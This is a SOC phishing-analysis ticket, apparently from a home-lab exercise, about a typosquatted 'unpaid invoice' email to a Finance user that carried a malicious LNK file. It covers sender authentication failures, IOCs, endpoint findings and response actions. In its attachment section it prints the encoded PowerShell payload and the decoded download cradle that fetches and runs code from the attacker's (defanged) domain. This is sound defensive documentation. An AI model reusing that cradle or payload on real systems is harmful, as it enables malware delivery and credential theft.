# SOC Ticket — Phishing Analysis

---

## Ticket Information

| Field | Detail |
|---|---|
| Ticket ID | PHI-001 |
| Date Opened | 2026-04-05 |
| Analyst | Christopher Rice |
| Priority | High |
| Status | Closed |
| Classification | Confirmed Phishing |
| Source | User Report |

---

## 1. Reporter Information

| Field | Detail |
|---|---|
| Reported By | Julianne Westcott |
| Department | Finance |
| Reporting Method | Phishing report submitted to SOC |
| Did user click any links? | Unknown |
| Did user open any attachments? | Yes |
| Did user enter credentials? | No — credentials harvested via endpoint compromise |

---

## 2. Email Details

| Field | Detail |
|---|---|
| Sender Display Name | A Griffin — B Packaging Inc |
| Sender Email Address | agriffin[@]bpakcaging[.]xyz |
| Recipient | julianne.westcott[@]hotmail.com |
| Subject Line | Unpaid Invoice Follow-Up |
| Mail Relay | Elastic Email (third-party relay — identified via DKIM-Signature and List-Unsubscribe headers) |
| DKIM | Fail — domain bpakcaging[.]xyz is a typosquat of legitimate vendor |
| SPF | Fail |
| DMARC | Fail |

---

## 3. Email Content Analysis

**Social Engineering Tactic:**
- [x] Urgency (unpaid invoice — financial pressure on Finance department)
- [x] Impersonation of trusted third party (B Packaging Inc — known business partner)
- [x] Lure relevant to recipient's role (invoice lure targeting Finance employee)

**Indicators of Phishing:**
- [x] Sender domain does not match legitimate vendor — `bpakcaging[.]xyz` vs `bpackaging.com`
- [x] Failed DKIM / SPF / DMARC
- [x] Encrypted attachment to evade gateway scanning
- [x] Password provided in email body for encrypted archive

---

## 4. Attachment Analysis

| Field | Detail |
|---|---|
| Archive Filename | Invoice_2023.zip |
| Archive Password | Invoice2023! |
| Extracted Filename | Invoice_20230103.lnk |
| File Type | Windows Shortcut (LNK) |
| Sandbox Detonation | Malicious — executes encoded PowerShell payload |

**LNKParse3 Output — Command Line Arguments (encoded payload):**
```
aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8Ad
wBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZgBpAGwAZQBzAC4AYgBwAGEAawBjAGEA
ZwBpAG4AZwAuAHgAeQB6AC8AdQBwAGQAYQB0AGUAJwApAA==
```

**Decoded payload:**
```powershell
iex (new-object net.webclient).downloadstring('hxxp://files[.]bpakcaging[.]xyz/update')
```

---

## 5. URL / Link Analysis

| URL (defanged) | Destination | Category |
|---|---|---|
| `hxxp://files[.]bpakcaging[.]xyz/update` | PowerShell stager download | Malware delivery |
| `hxxp://files[.]bpakcaging[.]xyz/02dcf07/update[.]zip` | Stage 2 payload archive | Malware delivery |

---

## 6. Infrastructure IOCs

| Type | Value (defanged) | Notes |
|---|---|---|
| Sender IP | Elastic Email relay | Third-party mail relay used to increase deliverability |
| Malicious Domain | bpakcaging[.]xyz | Typosquat of bpackaging.com — attacker-registered |
| Malicious Domain | files[.]bpakcaging[.]xyz | Payload hosting |
| Malicious Domain | cdn[.]bpakcaging[.]xyz | C2 server |
| Malicious URL | hxxp://files[.]bpakcaging[.]xyz/update | Initial stager |
| File | Invoice_20230103.lnk | Malicious LNK payload |

---

## 7. Affected User / Host Assessment

| Field | Detail |
|---|---|
| User Account | j.westcott |
| Interaction Type | Opened attachment — LNK executed PowerShell stager |
| Endpoint Isolation Required? | Yes |

**Endpoint Investigation:**

| Check | Finding |
|---|---|
| Suspicious processes running? | Yes — PowerShell with encoded command, stage 2 binary (first.exe) |
| Unusual network connections? | Yes — beacon to cdn[.]bpakcaging[.]xyz |
| Files dropped on disk? | Yes — C:\Users\Public\Downloads\first.exe |
| Persistence mechanisms found? | Yes — Startup folder payload |
| Credentials potentially exposed? | Yes — KeePass DB and Sticky Notes accessed and exfiltrated |

---

## 8. Verdict

- [x] **Confirmed Phishing**

**Justification:**
Sender domain `bpakcaging[.]xyz` is a typosquat of a known business partner. The attachment contained a password-protected ZIP with an LNK file executing an encoded PowerShell download cradle. Sandbox detonation confirmed malicious payload delivery. Classified as Confirmed Phishing — targeted attack on Finance department.

---

## 9. Actions Taken

| Time | Action | Result |
|---|---|---|
| T+00:05 | Quarantined email from all mailboxes | ✅ Complete |
| T+00:08 | Blocked bpakcaging[.]xyz and cdn[.]bpakcaging[.]xyz at DNS | ✅ Complete |
| T+00:10 | Blocked sender IP at email gateway | ✅ Complete |
| T+00:12 | Isolated Julianne's workstation from network | ✅ Complete |
| T+00:15 | Escalated to IR team — attachment executed, data exfiltrated | ✅ Complete |
| T+00:20 | Notified reporter of confirmed phishing verdict | ✅ Complete |

---

## 10. Escalation

| Field | Detail |
|---|---|
| Escalation Required? | Yes |
| Escalation Reason | Attachment executed — stage 2 payload deployed, data exfiltrated via DNS |
| Escalated To | IR Team |
| Linked IR Report | [IR-002 — Operation Boogeyman](https://github.com/Qwortie/soc-home-lab/blob/main/docs/incident-reports/IR-002-boogeyman.md) |

---

## 11. Analyst Notes

```
Targeted attack against Finance department using a business partner impersonation lure.
Attacker used Elastic Email relay to bypass basic sender reputation checks.
Encrypted ZIP attachment evaded gateway scanning — password provided in email body.
LNK payload used to avoid macro-based detection (no Office application required).
Full attack chain documented in IR-003.
```

---

## 12. Resolution

| Field | Detail |
|---|---|
| Closed By | Christopher Rice |
| Final Classification | Confirmed Phishing |
| User Notified? | Yes |
| Awareness Training Recommended? | Yes — password-protected archive social engineering |
